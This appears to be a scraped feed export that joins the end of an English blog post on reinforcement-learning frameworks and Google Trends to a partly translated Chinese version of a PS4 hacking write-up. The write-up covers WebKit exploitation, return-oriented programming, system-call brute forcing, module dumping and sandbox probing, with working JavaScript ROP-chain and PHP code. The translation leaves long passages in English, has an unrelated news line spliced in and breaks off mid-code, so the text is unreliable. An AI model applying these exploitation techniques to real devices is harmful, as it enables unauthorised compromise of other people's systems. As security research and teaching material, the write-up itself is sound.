steps=10) This trains a few different agents and produces a reward plot for each. Nice eh! The only thing I would suggest is that there shouldn’t be any environment implementation in simple_rl. That is out of scope. Leave that to Gym-like projects. For example, gym-minigrid has an awesome Gridworld implementation. Google RankingsGoogle’s Trends search tool allows you to find out what search queries are the most popular. Unfortunately they only provide relative measures and those change depending on what you are querying. Also, common words often get mixed into other queries. For example, searching for “Facebook Horizon” is mixed with a bunch of unrelated queries about “Forza Horizon 4” and “facebook log in”; clearly this inflates this score and cannot be trusted. I went through all of these frameworks and found that only two frameworks stood out, openai gym and google dopamine. But even for google dopamine, the related queries were google docs/scholar/translate/etc., so I’m not sure if I can trust this either. One of the things that stood out to me most was the geographical popularity. OpenAI Gym seemed to be the most popular search term, given that it has a high ranking score and all of the related queries are related to RL. But when you look at the how the ranking alters by geography, China is the country with the most searches. This strikes me as odd, because Google is banned in China and so how are they generating these statistics? Are users using VPNs and then searching, and Google is able to recognise that the original traffic is from China? Don’t Trust Google TrendsAll of this brings me to the conclusion that I can’t trust Google trends at all. OpenAI Gym does seem like the highest ranking RL related framework, which you might expect, but the bulk of that score is coming from China. But Google is blocked in China. Sooo.. 原文地址]]></content>

    <title><![CDATA[破解 PS4 - 第一部分：PS4 安全和用户态 ROP 简介]]></title>

    <content type="text"><![CDATA[原文标题 Hacking the PS4, part 1 Introduction to PS4’s security, and userland ROP (日期未知) 作者：CTurt 由于目前很长时间没有关于 PS4 破解的重大公告，我想解释一下 PS4 破解已经走了多远，以及阻止它进一步发展的原因。 我将解释一些通用于所有现代系统的安全概念，以及我在 PS4 上运行 ROP 测试所做的发现。 本系列文章的目标是展示完整的漏洞利用链，从访问 Internet 浏览器的网页，到最终在 PS4 上实现内核代码执行。 如果您对漏洞挖掘不是特别熟悉，那么您应该先阅读我的关于通过保存文件中的栈粉碎漏洞来破解 DS 游戏的文章。 您可以在此下载我的完整设置以自行运行这些测试；它目前仅适用于固件 1.76。如果您正在使用较旧的固件并希望更新到 1.76，则可以下载 1.76 PUP 文件并通过 USB 更新。 PS4 背景 您可能知道 PS4 使用的是定制的 AMD x86-64 CPU（8核），即使此特定版本可能与已知标准稍有不同，目前仍有许多研究成果可用于此 CPU 架构。 例如，PFLA（Page Fault Liberation Army）在 29C3 大会期间发布了仅使用页错误和 x86 MMU 实现完整图灵机的概念证明，您可以在 YouTube 上查看他们的精彩视频。 如果您尝试在虚拟机中运行代码并希望在主机 CPU 上执行指令，也会很有趣。 – EurAsia 新闻 3251 号文章 除了表现良好的 CPU 架构外，PS4 中使用的大部分软件都是开源的。 最值得注意的是，PS4 的 Orbis OS 基于 FreeBSD 9.0，就像 PS3 的操作系统一样（也有部分 NetBSD）；并包括各种许多其他开源软件，如 Mono VM 和 WebKit。 从 WebKit 入手WebKit 是开源的布局引擎，它被用于 iOS，Wii U，3DS，PS Vita 和 PS4 的浏览器中来呈现网页。 尽管 WebKit 被广泛使用，但它确实存在漏洞；通过阅读 Pwn2Own write-ups，你可以了解其中的许多内容。 特别是 PS4 1.76 版本固件中的浏览器使用的 WebKit 版本易受到 CVE-2012-3748 的攻击，这是由 JSArray :: sort(...) 方法中基于堆的缓冲区溢出造成的。 2014年，NAS 和 Proxima 宣布他们已经成功地将一个利用该漏洞破解 Mac OS X Safari 代码移植到 PS4 的浏览器，并公布了作为破解 PS4 第一个入口点的 PoC 代码。 这使我们可以任意读写 WebKit 进程可以读取和写入的内容，这些内容可以用于转储模块，并覆盖栈上的返回地址，让我们控制指令指针寄存器（rip）来实现 RO P执行。 从那时起，WebKit 中发现了许多其他漏洞，这些漏洞可能被用作 PS4 后期固件的入口点，但截至撰写时，没有人公开宣称将任何这些漏洞利用代码移植到 PS4。 如果您从未登录 PSN，您的 PS4 将无法打开 Internet 浏览器，但您可以转到“设置”，然后选择“用户指南”打开功能有限的 Web 浏览器视图，您可以用代理控制其中的内容。 ROP 是什么？与 DS 等早期设备不同，PS4 有一个内核来控制内存不同区域的属性。其中标记为可执行的内存页面不能被覆写，并且标记为可写的内存页面不能被执行; 这称为数据执行保护（DEP）。 这意味着我们不能只将有效负载复制到内存中并执行。但是，我们可以执行已加载到内存中并标记为可执行的代码。 如果我们不能将自己的代码编写到某个地址地址，那么跳转到该地址并不是非常有用，因此我们使用 ROP。 ROP（Return-Oriented Programming）是传统栈粉碎技术的扩展，我们可以将许多不同的地址（称为 gadgets）链接在一起，而不是仅覆盖 rip 将跳转到的单个值。 一条 gadget 通常只是一个所需的指令以及一个 ret。 在 x86_64 程序集中，当到达 ret 指令时，程序会从栈中弹出一个 64 位的值并且将 rip 跳转到它；由于我们可以控制堆栈，所以我们可以使每个 ret 指令跳转到下一个所需的 gadget。 例如 0x80000 处： mov rax, 0 ret 0x90000 处： mov rbx, 0 ret If we overwrite a return address on the stack to contain 0x80000 followed by 0x90000, then as soon as the first ret instruction is reached execution will jump to mov rax, 0, and immediately afterwards, the next ret instruction will pop 0x90000 off the stack and jump to mov rbx, 0. Effectively this chain will set both rax and rbx to 0, just as if we had written the code into a single location and executed it from there. ROP chains aren’t just limited to a list of addresses though; assuming that from 0xa0000 contains these instructions: pop rax ret We can set the first item in the chain to 0xa0000 and the next item to any desired value for rax. Gadgets also don’t have to end in a ret instruction; we can use gadgets ending in a jmp: add rax, 8 jmp rcx By making rcx point to a ret instruction, the chain will continue as normal: chain.add(&quot;pop rcx&quot;, &quot;ret&quot;); chain.add(&quot;add rax, 8; jmp rcx&quot;); Sometimes you won’t be able to find the exact gadget that you need on its own, but with other instructions after it. For example, if you want to set r8 to something, but only have this gadget, you will have to set r9 to some dummy value: pop r8 pop r9 ret Although you may have to be creative with how you write ROP chains, it is generally accepted that within a sufficiently large enough code dump, there will be enough gadgets for Turing-complete functionality; this makes ROP a viable method of defeating DEP. 寻找 gadgetsThink of ROP as writing a new chapter to a book, using only words that have appeared at the end of sentences in the previous chapters. It’s obvious from the structure of most sentences that we probably won’t be able to find words like ‘and’ or ‘but’ appearing at the end of any sentences, but we will need these connectives in order to write anything meaningful. It is quite possible however, that a sentence has ended with ‘sand’. Although the author only ever intended for the word to be read from the ‘s’, if we start reading from the ‘a’, it will appear as an entirely different word by coincidence, ‘and’. These principles also apply to ROP. Since almost all functions are structured with a prologue and epilogue: ; Save registers push rbp mov rbp, rsp push r15 push r14 push r13 push r12 push rbx sub rsp, 18h ; Function body ; Restore registers add rsp, 18h pop rbx pop r12 pop r13 pop r14 pop r15 pop rbp ret You’d expect to only be able to find pop gadgets, or more rarely, something like xor rax, rax to set the return value to 0 before returning. Having a comparison like: cmp [rax], r12 ret Wouldn’t make any sense since the result of the comparison isn’t used by the function. However, there is still a possibility that we can find gadgets like these. x86_64 instructions are similar to words in that they have variable lengths, and can mean something entirely different depending on where decoding starts. The x86_64 architecture is a variable-length CISC instruction set. Return-oriented programming on the x86_64 takes advantage of the fact that the instruction set is very “dense”, that is, any random sequence of bytes is likely to be interpretable as some valid set of x86_64 instructions. – Wikipedia To demonstrate this, take a look at the end of this function from the WebKit module: 000000000052BE0D mov eax, [rdx+8] 000000000052BE10 mov [rsi+10h], eax 000000000052BE13 or byte ptr [rsi+39h], 20h 000000000052BE17 ret Now take a look at what the code looks like if we start decoding from 0x52be14: 000000000052BE14 cmp [rax], r12 000000000052BE17 ret Even though this code was never intended to be executed, it is within an area of memory which has been marked as executable, so it is perfectly valid to use as a gadget. Of course, it would be incredibily time consuming to look at every possible way of interpreting code before every single ret instruction manually; and that’s why tools exist to do this for you. The one which I use to search for ROP gadgets is rp++; to generate a text file filled with gadgets, just use: rp-win-x64 -f mod14.bin --raw=x64 --rop=1 --unique &gt; mod14.txt General protection faultsIf we _do_ perform an access violation, such as by trying to execute a non-executable page of memory, or by trying to write to a non-writable page of memory, a general protection fault, or more specifically in this instance, a segmentation fault, will occur. For example, trying to execute code on the stack, which is mapped as read and write only: setU8to(chain.data + 0, 0xeb); setU8to(chain.data + 1, 0xfe); chain.add(chain.data); And trying to write to code, which is mapped as read and execute only: setU8to(moduleBases[webkit], 0); If a general protection fault occurs, a message saying “There is not enough free system memory” will appear, and the page will fail to load: This message will also be displayed for other hard faults, such as division by 0, or execution of an invalid instruction or unimplemented system call, but most commonly it will be encountered by performing a segmentation fault. ASLRAddress Space Layout Randomization (ASLR) is a security technique which causes the base addresses of modules to be different every time you start the PS4. It has been reported to me that very old firmwares (1.05) don’t have ASLR enabled, but it was introduced sometime before firmware 1.70. Note that kernel ASLR is not enabled (for firmwares 1.76 and lower at least), which will be proved later in the article. For most exploits ASLR would be a problem because if you don’t know the addresses of the gadgets in memory, you would have no idea what to write to the stack. Luckily for us, we aren’t limited to just writing static ROP chains. We can use JavaScript to read the modules table, which will tell us the base addresses of all loaded modules. Using these bases, we can then calculate the addresses of all our gadgets before we trigger ROP execution, defeating ASLR. The modules table also includes the filenames of the modules: WebProcess.self libkernel.sprx libSceLibcInternal.sprx libSceSysmodule.sprx libSceNet.sprx libSceNetCtl.sprx libSceIpmi.sprx libSceMbus.sprx libSceRegMgr.sprx libSceRtc.sprx libScePad.sprx libSceVideoOut.sprx libScePigletv2VSH.sprx libSceOrbisCompat.sprx libSceWebKit2.sprx libSceSysCore.sprx libSceSsl.sprx libSceVideoCoreServerInterface.sprx libSceSystemService.sprx libSceCompositeExt.sprx Although the PS4 predominantly uses the [Signed] PPU Relocatable Executable ([S]PRX) format for modules, some string references to [Signed] Executable and Linking Format ([S]ELF) object files can also be found in the libSceSysmodule.sprx dump, such as bdj.elf, web_core.elf and orbis-jsc-compiler.self. This combination of modules and objects is similar to what is used in the PSP and PS3. You can view a complete list of all modules available (not just those loaded by the browser) in libSceSysmodule.sprx. We can load and dump some of these through several of Sony’s custom system calls, which will be explained later in this article. JuSt-ROPUsing JavaScript to write and execute dynamic ROP chains gives us a tremendous advantage over a traditional, static buffer overflow attack. As well as being necessary to defeat ASLR, JavaScript also lets us read the user agent of the browser, and provide different ROP chains for different browser versions, giving our exploit a greater range of compatibility. We can even use JavaScript to read the memory at our gadgets’ addresses to check that they are correct, giving us almost perfect reliability. Theoretically, you could take this even further by writing a script to dynamically find ROP gadgets and then build ROP chains on the fly. Writing ROP chains dynamically, rather than generating them with a script beforehand, just makes sense. I created a JavaScript framework for writing ROP chains, JuSt-ROP, for this very reason. JavaScript caveatsJavaScript represents numbers using the IEEE-754 double-precision (64 bit) format. This provides us with 53 bit precision, meaning that it isn’t possible to represent every 64 bit value, approximations will have to be used for some. If you just need to set a 64 bit value to something low, like 256, then setU64to will be fine. But for situations in which you need to write a buffer or struct of data, there is the possibility that certain bytes will be written incorrectly if it has been written in 64 bit chunks. Instead, you should write data in 32 bit chunks (remembering that the PS4 is little endian), to ensure that every byte is exact. 系统调用Interestingly, the PS4 uses the same calling convention as Linux and MS-DOS for system calls, with arguments stored in registers, rather than the traditional UNIX way (which FreeBSD uses by default), with arguments stored in the stack: rax - System call number rdi - Argument 1 rsi - Argument 2 rdx - Argument 3 r10 - Argument 4 r8 - Argument 5 r9 - Argument 6 We can try to perform any system call with the following JuSt-ROP method: this.syscall = function(name, systemCallNumber, arg1, arg2, arg3, arg4, arg5, arg6) { console.log(&quot;syscall &quot; + name); this.add(&quot;pop rax&quot;, systemCallNumber); if(typeof(arg1) !== &quot;undefined&quot;) this.add(&quot;pop rdi&quot;, arg1); if(typeof(arg2) !== &quot;undefined&quot;) this.add(&quot;pop rsi&quot;, arg2); if(typeof(arg3) !== &quot;undefined&quot;) this.add(&quot;pop rdx&quot;, arg3); if(typeof(arg4) !== &quot;undefined&quot;) this.add(&quot;pop rcx&quot;, arg4); if(typeof(arg5) !== &quot;undefined&quot;) this.add(&quot;pop r8&quot;, arg5); if(typeof(arg6) !== &quot;undefined&quot;) this.add(&quot;pop r9&quot;, arg6); this.add(&quot;mov r10, rcx; syscall&quot;); } Just make sure to set the stack base to some free memory beforehand: this.add(&quot;pop rbp&quot;, stackBase + returnAddress + 0x1400); Using system calls can tell us a huge amount about the PS4 kernel. Not only that, but using system calls is most likely the only way that we can interact with the kernel, and thus potentially trigger a kernel exploit. If you are reverse engineering modules to identify some of Sony’s custom system calls, you may come across an alternative calling convention: Sometimes Sony performs system calls through regular system call 0 (which usually does nothing in FreeBSD), with the first argument (rdi) controlling which system call should be executed: rax - 0 rdi - System call number rsi - Argument 1 rdx - Argument 2 r10 - Argument 3 r8 - Argument 4 r9 - Argument 5 It is likely that Sony did this to have easy compatibility with the function calling convention. For example: .global syscall syscall: xor rax, rax mov r10, rcx syscall ret Using this, they can perform system calls from C using the function calling convention: int syscall(); int getpid(void) { return syscall(20); } When writing ROP chains, we can use either convention: // Both will get the current process ID: chain.syscall(&quot;getpid&quot;, 20); chain.syscall(&quot;getpid&quot;, 0, 20); It’s good to be aware of this, because we can use whichever one is more convenient for the gadgets that are available. getpidJust by using system call 20, getpid(void), we can learn a lot about the kernel. The very fact that this system call works at all tells us that Sony didn’t bother mixing up the system call numbers as a means of security through obscurity (under the BSD license they could have done this without releasing the new system call numbers). So, we automatically have a list of system calls in the PS4 kernel to try. Secondly, by calling getpid(), restarting the browser, and calling it again, we get a return value 2 higher than the previous value. This tells us that the Internet Browser app actually consists of 2 separate processes: the WebKit core (which we take over), that handles parsing HTML and CSS, decoding images, and executing JavaScript for example, and another one to handle everything else: displaying graphics, receiving controller input, managing history and bookmarks, etc. Also, although FreeBSD has supported PID randomisation since 4.0, sequential PID allocation is the default behaviour. The fact that PID allocation is set to the default behaviour indicates that Sony likely didn’t bother adding any additional security enhancements such as those encouraged by projects like HardenedBSD, other than userland ASLR. How many custom system calls are there?The last standard FreeBSD 9 system call is wait6, number 532; anything higher than this must be a custom Sony system call. Invoking most of Sony’s custom system calls without the correct arguments will return error 0x16, &quot;Invalid argument&quot;; however, any compatibility or unimplemented system calls will report the “There is not enough free system memory” error. Through trial and error, I have found that system call number 617 is the last Sony system call, anything higher is unimplemented. From this, we can conclude that there are 85 custom Sony system calls in the PS4’s kernel (617 - 532). libkernel.sprxTo identify how custom system calls are used by libkernel, you must first remember that it is just a modification of the standard FreeBSD 9.0 libraries. Here’s an extract of _libpthread_init from thr_init.c: /* * Check for the special case of this process running as * or in place of init as pid = 1: */ if ((_thr_pid = getpid()) == 1) { /* * Setup a new session for this process which is * assumed to be running as root. */ if (setsid() == -1) PANIC(&quot;Can&apos;t set session ID&quot;); if (revoke(_PATH_CONSOLE) != 0) PANIC(&quot;Can&apos;t revoke console&quot;); if ((fd = __sys_open(_PATH_CONSOLE, O_RDWR)) &amp;lt; 0) PANIC(&quot;Can&apos;t open console&quot;); if (setlogin(&quot;root&quot;) == -1) PANIC(&quot;Can&apos;t set login to root&quot;); if (_ioctl(fd, TIOCSCTTY, (char *) NULL) == -1) PANIC(&quot;Can&apos;t set controlling terminal&quot;); } The same function can be found at offset 0x215F0 from libkernel.sprx. This is how the above extract looks from within a libkernel dump: call getpid mov cs:dword_5B638, eax cmp eax, 1 jnz short loc_2169F call setsid cmp eax, 0FFFFFFFFh jz loc_21A0C lea rdi, aDevConsole ; &quot;/dev/console&quot; call revoke test eax, eax jnz loc_21A24 lea rdi, aDevConsole ; &quot;/dev/console&quot; mov esi, 2 xor al, al call open mov r14d, eax test r14d, r14d js loc_21A3C lea rdi, aRoot ; &quot;root&quot; call setlogin cmp eax, 0FFFFFFFFh jz loc_21A54 mov edi, r14d mov esi, 20007461h xor edx, edx xor al, al call ioctl cmp eax, 0FFFFFFFFh jz loc_21A6C Reversing module dumps to analyse system callslibkernel isn’t completely open source though; there’s also a lot of custom code which can help disclose some of Sony’s system calls. Although this process will vary depending on the system call you are looking up; for some, it is fairly easy to get a basic understanding of the arguments that are passed to it. The system call wrapper will be declared somewhere in libkernel.sprx, and will almost always follow this template: 000000000000DB70 syscall_601 proc near 000000000000DB70 mov rax, 259h 000000000000DB77 mov r10, rcx 000000000000DB7A syscall 000000000000DB7C jb short error 000000000000DB7E retn 000000000000DB7F 000000000000DB7F error: 000000000000DB7F lea rcx, sub_DF60 000000000000DB86 jmp rcx 000000000000DB86 syscall_601 endp Note that the mov r10, rcx instruction doesn’t necessarily mean that the system call takes at least 4 arguments; all system call wrappers have it, even those that take no arguments, such as getpid. Once you’ve found the wrapper, you can look up xrefs to it: 0000000000011D50 mov edi, 10h 0000000000011D55 xor esi, esi 0000000000011D57 mov edx, 1 0000000000011D5C call syscall_601 0000000000011D61 test eax, eax 0000000000011D63 jz short loc_11D6A It’s good to look up several of these, just to make sure that the registers weren’t modified for something unrelated: 0000000000011A28 mov edi, 9 0000000000011A2D xor esi, esi 0000000000011A2F xor edx, edx 0000000000011A31 call syscall_601 0000000000011A36 test eax, eax 0000000000011A38 jz short loc_11A3F Consistently, the first three registers of the system call convention (rdi, rsi, and rdx) are modified before invoking the call, so we can conclude with reasonable confidence that it takes 3 arguments. For clarity, this is how we would replicate the calls in JuSt-ROP: chain.syscall(&quot;unknown&quot;, 601, 0x10, 0, 1); chain.syscall(&quot;unknown&quot;, 601, 9, 0, 0); As with most system calls, it will return 0 on success, as seen by the jz conditional after testing the return value. Looking up anything beyond than the amount of arguments will require a much more in-depth analysis of the code before and after the call to understand the context, but this should help you get started. Brute forcing system callsAlthough reverse engineering module dumps is the most reliable way to identify system calls, some aren’t referenced at all in the dumps we have so we will need to analyse them blindly. If we guess that a certain system call might take a particular set of arguments, we can brute force all system calls which return a certain value (0 for success) with the arguments that we chose, and ignore all which returned an error. We can also pass 0s for all arguments, and brute force all system calls which return useful errors such as 0xe, &quot;Bad address&quot;, which would indicate that they take at least one pointer. Firstly, we will need to execute the ROP chain as soon as the page loads. We can do this by attaching our function to the body element’s onload: &lt;body onload=&quot;exploit()&quot;&gt; Next we will need to perform a specific system call depending on an HTTP GET value. Although this can be done with JavaScript, I will demonstrate how to do this using PHP for simplicity: var Sony = 533; chain.syscall(&quot;Sony system call&quot;, Sony + &amp;lt;?php print($_GET[&quot;b&quot;]); ?&amp;gt;, 0, 0, 0, 0, 0, 0); chain.write_rax_ToVariable(0); Once the system call has executed, we can check the return value, and if it isn’t interesting, redirect the page to the next system call: if(chain.getVariable(0) == 0x16) window.location.assign(&quot;index.php?b=&quot; + (&amp;lt;?php print($_GET[&quot;b&quot;]); ?&amp;gt; + 1).toString()); Running the page with ?b=0 appended to the end will start the brute force from the first Sony system call. Although this method requires a lot of experimentation, by passing different values to some of the system calls found by brute forcing and analysing the new return values, there are a few system calls which you should be able to partially identify. System call 538As an example, I’ll take a look at system call 538, without relying on any module dumps. These are the return values depending on what is passed as the first argument: 0 - 0x16, &quot;Invalid argument&quot; 1 - 0xe, &quot;Bad address&quot; Pointer to 0s - 0x64 initially, but each time the page is refreshed this value increases by 1 Other potential arguments to try would be PID, thread ID, and file descriptor. Although most system calls will return 0 on success, due to the nature of the return value increasing after each time it is called, it seems like it is allocating a resource number, such as a file descriptor. The next thing to do would be to look at the data before and after performing the system call, to see if it has been written to. Since there is no change in the data, we can assume that it is an input for now. I then tried passing a long string as the first argument. You should always try this with every input you find because there is the possibility of discovering a buffer overflow. writeString(chain.data, &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;); chain.syscall(&quot;unknown&quot;, 538, chain.data, 0, 0, 0, 0, 0); The return value for this is 0x3f, ENAMETOOLONG. Unfortunately it seems that this system call correctly limits the name (32 bytes including NULL truncator), but it does tell us that it _is_ expecting a string, rather than a struct. We now have a few possibilities for what this system call is doing, the most obvious being something related to the filesystem (such as a custom mkdir or open), but this doesn’t seem particularly likely seeing as a resource was allocated even before we wrote any data to the pointer. To test whether the first parameter is a path, we can break it up with multiple / characters to see if this allows for a longer string: writeString(chain.data, &quot;aaaaaaaaaa/aaaaaaaaaa/aaaaaaaaaa&quot;); chain.syscall(&quot;unknown&quot;, 538, chain.data, 0, 0, 0, 0, 0); Since this also returns 0x3f, we can assume that the first argument isn’t a path; it is a name for something that gets allocated a sequential identifier. After analysing some more system calls, I found that the following all shared this exact same behaviour: 533 538 557 574 580 From the information that we have so far, it is almost impossible to pinpoint exactly what these system calls do, but as you run more tests, further information will slowly be revealed. To save you some time, system call 538 is allocating an event flag (and it doesn’t just take a name). Using general knowledge of how a kernel works, you can guess, and then verify, what the system calls are allocating (semaphores, mutexes, etc). Dumping additional modulesWe can dump additional modules by following these stages: Load the module Get the module’s base address Dump the module I’ve extracted and posted a list of all module names on psdevwiki. To load a module we will need to use the sceSysmoduleLoadModule function from libSceSysmodule.sprx + 0x1850. The first parameter is the module ID to load, and the other 3 should just be passed 0. The following JuSt-ROP method can be used to perform a function call: this.call = function(name, module, address, arg1, arg2, arg3, arg4, arg5, arg6) { console.log(&quot;call &quot; + name); if(typeof(arg1) !== &quot;undefined&quot;) this.add(&quot;pop rdi&quot;, arg1); if(typeof(arg2) !== &quot;undefined&quot;) this.add(&quot;pop rsi&quot;, arg2); if(typeof(arg3) !== &quot;undefined&quot;) this.add(&quot;pop rdx&quot;, arg3); if(typeof(arg4) !== &quot;undefined&quot;) this.add(&quot;pop rcx&quot;, arg4); if(typeof(arg5) !== &quot;undefined&quot;) this.add(&quot;pop r8&quot;, arg5); if(typeof(arg6) !== &quot;undefined&quot;) this.add(&quot;pop r9&quot;, arg6); this.add(module_bases[module] + address); } So, to load libSceAvSetting.sprx (0xb): chain.call(&quot;sceSysmoduleLoadModule&quot;, libSysmodule, 0x1850, 0xb, 0, 0, 0); Unfortunately, a fault will be triggered when trying to load certain modules; this is because the sceSysmoduleLoadModule function doesn’t load dependencies, so you will need to manually load them first. Like most system calls, this should return 0 on success. To see the loaded module ID that was allocated, we can use one of Sony’s custom system calls, number 592, to get a list of currently loaded modules: var countAddress = chain.data; var modulesAddress = chain.data + 8; // System call 592, getLoadedModules(int *destinationModuleHandles, int max, int *count); chain.syscall(&quot;getLoadedModules&quot;, 592, modulesAddress, 256, countAddress); chain.execute(function() { var count = getU64from(countAddress); for(var index = 0; index &amp;lt; count; index++) { logAdd(&quot;Module handle: 0x&quot; + getU32from(modulesAddress + index * 4).toString(16)); } }); Running this without loading any additional modules will produce the following list: 0x0, 0x1, 0x2, 0xc, 0xe, 0xf, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1e, 0x37, 0x59 But if we run it after loading module 0xb, we will see an additional entry, 0x65. Remember that module ID is not the same as loaded module handle. We can now use another of Sony’s custom system calls, number 593, which takes a module handle and a buffer, and fills the buffer with information about the loaded module, including its base address. Since the next available handle is always 0x65, we can hardcode this value into our chain, rather than having to store the result from the module list. The buffer must start with the size of the struct that should be returned, otherwise error 0x16 will be returned, &quot;Invalid argument&quot;: setU64to(moduleInfoAddress, 0x160); chain.syscall(&quot;getModuleInfo&quot;, 593, 0x65, moduleInfoAddress); chain.execute(function() { logAdd(hexDump(moduleInfoAddress, 0x160)); }); It will return 0 upon success, and fill the buffer with a struct which can be read like so: var name = readString(moduleInfoAddress + 0x8); var codeBase = getU64from(moduleInfoAddress + 0x108); var codeSize = getU32from(moduleInfoAddress + 0x110); var dataBase = getU64from(moduleInfoAddress + 0x118); var dataSize = getU32from(moduleInfoAddress + 0x120); We now have everything we need to dump the module! dump(codeBase, codeSize + dataSize); There is another Sony system call, number 608, which works in a similar way to 593, but provides slightly different information about the loaded module: setU64to(moduleInfoAddress, 0x1a8); chain.syscall(&quot;getDifferentModuleInfo&quot;, 608, 0x65, 0, moduleInfoAddress); logAdd(hexDump(moduleInfoAddress, 0x1a8)); It’s not clear what this information is. Browsing the filesystemThe PS4 uses the standard FreeBSD 9.0 system calls for reading files and directories. However, whilst using read for some directories such as /dev/ will work, others, such as / will fail. I’m not sure why this is, but if we use getdents instead of read for directories, it will work much more reliably: writeString(chain.data, &quot;/dev/&quot;); chain.syscall(&quot;open&quot;, 5, chain.data, 0, 0); chain.write_rax_ToVariable(0); chain.read_rdi_FromVariable(0); chain.syscall(&quot;getdents&quot;, 272, undefined, chain.data + 0x10, 1028); This is the resultant memory: 0000010: 0700 0000 1000 0205 6469 7073 7700 0000 ........dipsw... 0000020: 0800 0000 1000 0204 6e75 6c6c 0000 0000 ........null.... 0000030: 0900 0000 1000 0204 7a65 726f 0000 0000 ........zero.... 0000040: 0301 0000 0c00 0402 6664 0000 0b00 0000 ........fd...... 0000050: 1000 0a05 7374 6469 6e00 0000 0d00 0000 ....stdin....... 0000060: 1000 0a06 7374 646f 7574 0000 0f00 0000 ....stdout...... 0000070: 1000 0a06 7374 6465 7272 0000 1000 0000 ....stderr...... 0000080: 1000 0205 646d 656d 3000 0000 1100 0000 ....dmem0....... 0000090: 1000 0205 646d 656d 3100 0000 1300 0000 ....dmem1....... 00000a0: 1000 0206 7261 6e64 6f6d 0000 1400 0000 ....random...... 00000b0: 1000 0a07 7572 616e 646f 6d00 1600 0000 ....urandom..... 00000c0: 1400 020b 6465 6369 5f73 7464 6f75 7400 ....deci_stdout. 00000d0: 1700 0000 1400 020b 6465 6369 5f73 7464 ........deci_std 00000e0: 6572 7200 1800 0000 1400 0209 6465 6369 err.........deci 00000f0: 5f74 7479 3200 0000 1900 0000 1400 0209 _tty2........... 0000100: 6465 6369 5f74 7479 3300 0000 1a00 0000 deci_tty3....... 0000110: 1400 0209 6465 6369 5f74 7479 3400 0000 ....deci_tty4... 0000120: 1b00 0000 1400 0209 6465 6369 5f74 7479 ........deci_tty 0000130: 3500 0000 1c00 0000 1400 0209 6465 6369 5...........deci 0000140: 5f74 7479 3600 0000 1d00 0000 1400 0209 _tty6........... 0000150: 6465 6369 5f74 7479 3700 0000 1e00 0000 deci_tty7....... 0000160: 1400 020a 6465 6369 5f74 7479 6130 0000 ....deci_ttya0.. 0000170: 1f00 0000 1400 020a 6465 6369 5f74 7479 ........deci_tty 0000180: 6230 0000 2000 0000 1400 020a 6465 6369 b0.. .......deci 0000190: 5f74 7479 6330 0000 2200 0000 1400 020a _ttyc0..&quot;....... 00001a0: 6465 6369 5f73 7464 696e 0000 2300 0000 deci_stdin..#... 00001b0: 0c00 0203 6270 6600 2400 0000 1000 0a04 ....bpf.$....... 00001c0: 6270 6630 0000 0000 2900 0000 0c00 0203 bpf0....)....... 00001d0: 6869 6400 2c00 0000 1400 0208 7363 655f hid.,.......sce_ 00001e0: 7a6c 6962 0000 0000 2e00 0000 1000 0204 zlib............ 00001f0: 6374 7479 0000 0000 3400 0000 0c00 0202 ctty....4....... 0000200: 6763 0000 3900 0000 0c00 0203 6463 6500 gc..9.......dce. 0000210: 3a00 0000 1000 0205 6462 6767 6300 0000 :.......dbggc... 0000220: 3e00 0000 0c00 0203 616a 6d00 4100 0000 &gt;.......ajm.A... 0000230: 0c00 0203 7576 6400 4200 0000 0c00 0203 ....uvd.B....... 0000240: 7663 6500 4500 0000 1800 020d 6e6f 7469 vce.E.......noti 0000250: 6669 6361 7469 6f6e 3000 0000 4600 0000 fication0...F... 0000260: 1800 020d 6e6f 7469 6669 6361 7469 6f6e ....notification 0000270: 3100 0000 5000 0000 1000 0206 7573 6263 1...P.......usbc 0000280: 746c 0000 5600 0000 1000 0206 6361 6d65 tl..V.......came 0000290: 7261 0000 8500 0000 0c00 0203 726e 6700 ra..........rng. 00002a0: 0701 0000 0c00 0403 7573 6200 c900 0000 ........usb..... 00002b0: 1000 0a07 7567 656e 302e 3400 0000 0000 ....ugen0.4..... 00002c0: 0000 0000 0000 0000 0000 0000 0000 0000 ................ You can read some of these devices, for example: reading /dev/urandom will fill the memory with random data. It is also possible to parse this memory to create a clean list of entries; look at browser.html in the repository for a complete file browser: Unfortunately, due to sandboxing we don’t have complete access to the file system. Trying to read files and directories that do exist but are restricted will give you error 2, ENOENT, &quot;No such file or directory&quot;. We do have access to a lot of interesting stuff though including encrypted save data, trophies, and account information. I will go over more of the filesystem in my next article. SandboxingAs well as file related system calls failing for certain paths, there are other reasons for a system call to fail. Most commonly, a disallowed system call will just return error 1, EPERM, &quot;Operation not permitted&quot;; such as trying to use ptrace, but other system calls may fail for different reasons: Compatibilty system calls are disabled. If you are trying to call mmap for example, you must use system call number 477, not 71 or 197; otherwise a segfault will be triggered. Other system calls such as exit will also trigger a fault: chain.syscall(&quot;exit&quot;, 1, 0); Trying to create an SCTP socket will return error 0x2b, EPROTONOSUPPORT, indicating that SCTP sockets have been disabled in the PS4 kernel: //int socket(int domain, int type, int protocol); //socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP); chain.syscall(&quot;socket&quot;, 97, 2, 1, 132); And although calling mmap with PROT_READ | PROT_WRITE | PROT_EXEC will return a valid pointer, the PROT_EXEC flag is ignored. Reading its protection will return 3 (RW), and any attempt to execute the memory will trigger a segfault: chain.syscall(&quot;mmap&quot;, 477, 0, 4096, 1 | 2 | 4, 4096, -1, 0); chain.write_rax_ToVariable(0); chain.read_rdi_FromVariable(0); chain.add(&quot;pop rax&quot;, 0xfeeb); chain.add(&quot;mov [rdi], rax&quot;); chain.add(&quot;mov rax, rdi&quot;); chain.add(&quot;jmp rax&quot;); The list of open source software used in the PS4 doesn’t list any kind of sandboxing software like Capsicum, so the PS4 must use either pure FreeBSD jails, or some kind of custom, proprietary, sandboxing system (unlikely). JailsWe can prove the existence of FreeBSD jails being actively used in the PS4’s kernel through the auditon system call being impossible to execute within a jailed environment: chain.syscall(&quot;auditon&quot;, 446, 0, 0, 0); The first thing the auditon system call does is check jailed here, and if so, return ENOSYS: if (jailed(td-&gt;td_ucred)) return (ENOSYS); Otherwise the system call would most likely return EPERM from the mac_system_check_auditon here: error = mac_system_check_auditon(td-&gt;td_ucred, uap-&gt;cmd); if (error) return (error); Or from the priv_check here: error = priv_check(td, PRIV_AUDIT_CONTROL); if (error) return (error); The absolute furthest that the system call could reach would be immediately after the priv_check, here, before returning EINVAL due to the length argument being 0: if ((uap-&gt;length 